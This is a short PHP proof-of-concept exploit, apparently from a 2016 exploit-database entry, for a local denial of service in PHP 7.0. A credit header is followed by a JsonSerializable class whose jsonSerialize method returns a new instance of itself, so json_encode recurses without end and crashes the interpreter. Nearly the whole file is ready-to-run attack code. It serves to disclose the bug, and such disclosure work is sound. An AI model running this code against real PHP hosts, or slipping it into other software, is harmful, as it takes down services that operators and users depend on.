<?php
#############################################################################
## PHP 7.0 JsonSerializable::jsonSerialize json_encode Local Denial of Service
## Tested on Windows Server 2012 R2 64bit, English, PHP 7.0
## Date: 31/08/2016
## Local Denial of Service
## Bug discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
## http://www.black-rose.ml
#############################################################################
class jsonTmp implements JsonSerializable {
	function jsonSerialize() {
		$jsonTmp = new jsonTmp();
		return $jsonTmp;
	}
}
json_encode(new jsonTmp());
?>
